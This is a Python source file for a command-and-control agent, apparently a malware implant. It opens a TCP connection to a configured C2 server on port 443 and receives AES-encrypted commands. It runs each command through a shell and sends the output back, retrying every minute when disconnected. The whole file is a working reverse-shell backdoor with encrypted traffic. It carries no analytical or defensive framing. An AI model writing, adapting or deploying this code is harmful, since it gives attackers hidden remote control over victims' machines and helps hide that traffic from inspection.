import socket
import subprocess
import platform
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# Configuration
C2_HOST = '127.0.0.1'  # Server IP
C2_PORT = 443
BUFFER_SIZE = 4096
SECRET_KEY = hashlib.sha256(b'MySecretPassphrase').digest()  # Must match the server


class Agent:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.os_type = platform.system()

    def encrypt(self, data):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        return cipher.iv + ct_bytes

    def decrypt(self, data):
        iv, ct = data[:16], data[16:]
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()

    def execute_command(self, command):
        try:
            output = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return output.decode('utf-8', errors='replace')
        except Exception as e:
            return str(e)

    def beacon(self):
        while True:
            try:
                self.sock.connect((C2_HOST, C2_PORT))
                # Verify connection
                self.sock.send(self.encrypt(f"check_in:{self.os_type}"))

                # COMMAND LOOP
                while True:
                    encrypted_command = self.sock.recv(BUFFER_SIZE)
                    if not encrypted_command:
                        break

                    command = self.decrypt(encrypted_command)

                    # Exit command - break both inner and outer loops
                    if command.lower() == 'exit':
                        # print("Exiting as per server command")
                        return  # Terminate client completely

                    # Execute command and send result
                    result = self.execute_command(command)
                    self.sock.send(self.encrypt(result))

            except (ConnectionResetError, ConnectionRefusedError) as e:
                print(f"Connection error: {e}")
                time.sleep(60)
            except Exception as e:
                print(f"Critical error: {e}")
                time.sleep(60)
            finally:
                try:
                    self.sock.close()
                except:
                    pass
                # Create new socket - ONLY in case of connection error
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


if __name__ == "__main__":
    agent = Agent()
    agent.beacon()